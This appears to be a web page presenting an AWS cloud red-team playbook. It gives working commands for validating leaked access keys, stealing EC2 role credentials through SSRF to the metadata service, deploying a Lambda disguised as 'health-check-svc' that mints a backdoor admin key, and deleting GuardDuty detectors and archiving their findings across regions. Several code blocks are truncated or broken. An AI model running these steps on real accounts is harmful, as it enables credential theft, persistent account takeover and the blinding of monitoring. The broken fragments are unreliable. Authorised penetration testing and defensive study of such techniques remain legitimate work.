AWS Cloud Red Team Operations

Comprehensive adversarial guide covering all phases from initial access to full account compromise across 11 AWS services

🗺 Attack Surface Overview
AWS environments expose a massive distributed attack surface spanning identity (IAM/SSO), compute (EC2, Lambda, ECS/EKS), storage (S3, EBS), databases (RDS), networking (VPC), secrets management, and logging/monitoring services. Effective red teaming requires understanding how permissions chain across these services and how a single misconfiguration can lead to full account compromise.

Primary Objectives

  • Gain persistent access to AWS account
  • Escalate to AdministratorAccess
  • Exfiltrate secrets, DBs, source code
  • Achieve cross-account compromise
  • Disable detection and monitoring

Key Attack Tools

  • Pacu - AWS exploitation framework
  • PMapper - Privilege escalation graph
  • ScoutSuite - Multi-cloud auditor
  • Cloudsplaining - IAM deep analysis
  • Prowler - CIS benchmark scanner
  • CloudMapper - Network visualization

🚪 Initial Access

Techniques for obtaining the first foothold into an AWS environment

1. IAM Access Key Leakage
CRITICALT1552.001
Access keys hardcoded in source code, committed to GitHub, baked into Docker images, or exposed in CI/CD logs. The most common initial access vector — and the most dangerous since keys persist until explicitly rotated.
🔍 Discovery Methods ▼
  • GitHub dork: AKIA site:github.com target.com
  • TruffleHog / GitLeaks automated repo scanning
  • Docker Hub image layer inspection for baked-in creds
  • CI/CD log scraping (Jenkins, GitHub Actions, GitLab CI)
  • Public S3 objects containing .env or config files
# Scan Git history for AWS keys
trufflehog git https://github.com/target/repo --only-verified
gitleaks detect --source=/path/to/repo -v

# Validate leaked key
aws sts get-caller-identity   --access-key-id AKIAIOSFODNN7EXAMPLE   --secret-access-key wJalrXUtnFEMI/K7MDENG/bPxRfi

# Enumerate permissions of found key
aws iam list-attached-user-policies --user-name $(aws iam get-user --query "User.UserName" -o text)
aws iam simulate-principal-policy   --policy-source-arn ARN   --action-names "iam:CreateUser" "s3:GetObject" "ec2:RunInstances"

3. SSRF to IMDS — Steal EC2 Role Credentials
CRITICALT1552.005
Server-Side Request Forgery in web applications running on EC2/ECS allows querying the Instance Metadata Service to steal the attached IAM role credentials.
🔴 IMDSv1 (No protection) ▼
# Direct SSRF to IMDS — no auth required
GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Reveals role name, then:
GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE-NAME
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration

export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=AQoEXAMPLE...

Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
# Response: TOKEN_VALUE

# Step 2: Use token to fetch credentials
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE

⚡ Execution

Running attacker-controlled code within the AWS environment

1. Lambda Function Code Injection
CRITICALT1648
Create new Lambda or hijack existing function with a high-privilege role. Lambda is the most versatile code execution primitive — runs in milliseconds, no servers to manage, and hard to attribute.
🆕 Create Function with Admin Role ▼
# Requires: iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
cat > /tmp/pwn.py << EOF
import boto3, json, subprocess, os
def handler(event, context):
    iam = boto3.client("iam")
    sts = boto3.client("sts")
    identity = sts.get_caller_identity()
    # Create backdoor admin key
    key = iam.create_access_key(UserName="admin")
    return {"identity": identity, "key": key["AccessKey"]}
EOF
cd /tmp && zip payload.zip pwn.py

aws lambda create-function   --function-name health-check-svc   --runtime python3.12   --role arn:aws:iam::ACCOUNT:role/AdminRole   --handler pwn.handler   --zip-file fileb:///tmp/payload.zip

aws lambda invoke --function-name health-check-svc /tmp/out.json
cat /tmp/out.json
🔄 Hijack Existing Function (lambda:UpdateFunctionCode only) ▼
# Find functions with powerful roles
aws lambda list-functions --query "Functions[*].[FunctionName,Role]" -o table
# Look for: AdminRole, DeployRole, OrganizationRole

# Update existing function code (no PassRole required)

🔑 Credential Access

Stealing AWS credentials, secrets, tokens and keys from the environment

1. EC2 Instance Metadata Service (IMDS)
CRITICALT1552.005
The IMDS endpoint at 169.254.169.254 is accessible from any process on an EC2 instance. It provides temporary IAM role credentials, user data, and full instance configuration — no authentication needed.
📋 Full IMDS Enumeration ▼

# { "AccessKeyId":"ASIA...", "SecretAccessKey":"...", "Token":"...", "Expiration":"..." }

# Get user data (often contains secrets/configs)

# Get all available metadata keys
curl -s http://169.254.169.254/latest/meta-data/
# hostname, placement/, security-groups, network/, tags/instance/

2. GuardDuty — Kill Threat Detection
CRITICALT1562
GuardDuty continuously analyzes CloudTrail, DNS, and VPC Flow Logs for suspicious activity. Deleting the detector prevents any future findings. Act quickly — GuardDuty may have already fired on earlier actions.
🛡 GuardDuty Deletion ▼

aws guardduty list-detectors

# Disable then delete detector
aws guardduty update-detector --detector-id DETECTOR_ID --no-enable
aws guardduty delete-detector --detector-id DETECTOR_ID

aws guardduty list-findings --detector-id DETECTOR_ID   --query "FindingIds" -o text |   xargs aws guardduty archive-findings --detector-id DETECTOR_ID --finding-ids

# Multi-region sweep
for region in $(aws ec2 describe-regions --query "Regions[*].RegionName" -o text); do
  DETECTOR=$(aws guardduty list-detectors --region $region     --query "DetectorIds[0]" -o text 2>/dev/null)

  }
done
